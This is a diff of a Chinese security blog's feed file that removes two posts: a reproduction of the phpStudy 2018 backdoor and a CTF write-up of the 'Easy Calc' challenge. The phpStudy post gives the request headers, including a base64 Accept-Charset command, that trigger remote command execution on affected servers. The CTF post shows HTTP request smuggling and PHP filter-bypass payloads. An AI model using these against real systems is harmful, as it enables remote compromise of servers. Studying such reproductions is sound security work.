href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener">github</a></p>]]></content>
     
     <summary type="html">
     
-      Here&#39;s something encrypted, password is required to continue reading.
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;是不是看到这种统一身份认证中心是不是感觉无从下手.&lt;br&gt;&lt;img data-src=&quot;/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80
+      
     
     </summary>
     
@@ -435,52 +497,6 @@
     
     
       <category term="代码审计" scheme="https://www.wafer.org.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Phpstduy后门复现</title>
-    <link href="https://www.wafer.org.cn/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/"/>
-    <id>https://www.wafer.org.cn/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/</id>
-    <published>2019-11-06T07:42:38.195Z</published>
-    <updated>2019-10-18T02:34:20.148Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>win7+phpStudy 2018(php-5.4.45+Apache)<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/2.png" alt="2.png"></p><a id="more"></a><h2 id="后门验证"><a href="#后门验证" class="headerlink" title="后门验证"></a>后门验证</h2><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p><p>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll<br>存在@eval(%s(‘%s’));即说明有后门。<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/4.png" alt="4.png"></p><h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><p>访问ip地址用burp抓包<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/1.png" alt="1.png"><br>在请求头里构造 Accept-Encoding 和 accept-charset 即可。<br>Accept-Encoding 已经有了，但是这里注意：<br>要把gzip, deflate 里gzip逗号后面的空格去掉，不然命令执行不成功。<br>然后在请求头里添加 accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==<br>Accept-Charset 的值就是行的命令，默认是system(‘net user’);<br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/6.png" alt="6.png"><br>如果后续有时间，尽快能会写个批量扫描后门脚本</p><p>此文章参考了<a href="https://dylan903.coding.me/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/" target="_blank" rel="noopener">dylan’s blog</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;win7+phpStudy 2018(php-5.4.45+Apache)&lt;br&gt;&lt;img src=&quot;/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/2.png&quot; alt=&quot;2.png&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-      <category term="漏洞复现" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Easy Calc</title>
-    <link href="https://www.wafer.org.cn/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/"/>
-    <id>https://www.wafer.org.cn/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/</id>
-    <published>2019-11-06T07:42:38.194Z</published>
-    <updated>2020-03-20T09:46:03.937Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><p>http请求走私<br>数学函数任意字符转换。<br><img data-src="/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/1.png" alt="1.png"></p><a id="more"></a><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="http请求走私？"><a href="#http请求走私？" class="headerlink" title="http请求走私？"></a>http请求走私？</h3><p>前端服务器（cdn）和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞；为什么会不一致呢？<br>主要是处理Content-Length和Transfer-Encoding不一致，原则上同时使用两者时，Content-Length是无效的，当单个服务器时，没有任何问题，但当多个服务器时，理解的数据不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效，这样超出的长度就会拼接到下一次请求，从而导致漏洞。<br>攻击方法：<br>CL-TE(Content-Length,Transfer-Encoding)<br>TE-CL(Transfer-Encoding,Content-Length)<br>TE-TE(Transfer-Encoding,Transfer-Encoding)<br>详细请了解<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层攻击</a></p><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><p>base_convert() 函数在任意进制之间转换数字。<br>dechex() 函数把十进制数转换为十六进制数。<br>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>直接进入正题通过寻找发现一处calc.php文件<br><img data-src="/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/2.png" alt="2.png"><br>通过对代码分析就是传入num参数值不能存在$blacklist黑名单里，如果存在就结束输出“what are you want to do?”<br>经过测试还发现他存在waf，通过http走私来绕过waf。<br><img data-src="/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/3.png" alt="3.png"><br>现在我们通过参看phpinfo里面禁用函数得知我们可以利用var_dump(scandir(‘/‘));来找出我们想要的flag位置<br>现在就要利用到数学函数来构造payload<br>用数学函数把var_dump(scandir(‘/‘))</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="name">base_convert</span>(<span class="number">61693386291</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="name">hex2bin</span>(<span class="name">dechex</span>(<span class="number">47</span>))))</span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/4.png" alt="4.png"><br>现在以知道flagg文件 我门可以通过readfile来读取文件，方法还是跟上面一样</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">2146934604002</span>,<span class="number">10</span>,<span class="number">36</span>)(hex2bin(dechex(<span class="number">47</span>)).base_convert(<span class="number">25254448</span>,<span class="number">10</span>,<span class="number">36</span>))</span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/5.png" alt="5.png"></p><p>flag{a4273154-7184-40ad-8a83-9fc803239efb}</p><p>如果写的不对还请师傅们斧正。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;考点&quot;&gt;&lt;a href=&quot;#考点&quot; class=&quot;headerlink&quot; title=&quot;考点&quot;&gt;&lt;/a&gt;考点&lt;/h1&gt;&lt;p&gt;http请求走私&lt;br&gt;数学函数任意字符转换。&lt;br&gt;&lt;img src=&quot;/2019/11/06/http%E8%B5%B0%E7%A7%81%E2%80%94calc/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="ctf" scheme="https://www.wafer.org.cn/categories/ctf/"/>
-    
-    
-      <category term="http走私" scheme="https://www.wafer.org.cn/tags/http%E8%B5%B0%E7%A7%81/"/>
     
   </entry>
   
